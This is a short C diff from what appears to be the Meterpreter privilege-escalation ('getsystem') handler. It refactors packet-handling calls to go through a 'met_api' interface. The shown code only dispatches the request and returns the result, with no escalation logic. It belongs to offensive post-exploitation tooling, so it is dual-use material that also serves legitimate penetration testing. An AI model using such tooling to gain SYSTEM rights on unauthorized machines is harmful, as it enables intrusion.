@@ -3,6 +3,7 @@
  * @brief Definitions for SYSTEM privilege escalation.
  */
 #include "precomp.h"
+#include "common_metapi.h"
 #include "namedpipe.h"
 #include "tokendup.h"
 
@@ -74,11 +75,11 @@ DWORD elevate_getsystem( Remote * remote, Packet * packet )
 
 	do
 	{
-		response = packet_create_response( packet );
+		response = met_api->packet.create_response( packet );
 		if( !response )
-			BREAK_WITH_ERROR( "[ELEVATE] get_system. packet_create_response failed", ERROR_INVALID_HANDLE );
+			BREAK_WITH_ERROR( "[ELEVATE] get_system. met_api->packet.create_response failed", ERROR_INVALID_HANDLE );
 
-		dwTechnique = packet_get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_TECHNIQUE );
+		dwTechnique = met_api->packet.get_tlv_value_uint( packet, TLV_TYPE_ELEVATE_TECHNIQUE );
 		dprintf( "[ELEVATE] Technique requested (%u)", dwTechnique );
 		
 		if( dwTechnique == ELEVATE_TECHNIQUE_ANY || dwTechnique == ELEVATE_TECHNIQUE_SERVICE_NAMEDPIPE ) {
@@ -108,8 +109,8 @@ DWORD elevate_getsystem( Remote * remote, Packet * packet )
 
 	if( response )
 	{
-		packet_add_tlv_uint( response, TLV_TYPE_ELEVATE_TECHNIQUE,  dwResult == ERROR_SUCCESS ? dwTechnique : ELEVATE_TECHNIQUE_NONE );
-		packet_transmit_response( dwResult, remote, response );
+		met_api->packet.add_tlv_uint( response, TLV_TYPE_ELEVATE_TECHNIQUE,  dwResult == ERROR_SUCCESS ? dwTechnique : ELEVATE_TECHNIQUE_NONE );
+		met_api->packet.transmit_response( dwResult, remote, response );
 	}
 
 	return dwResult;
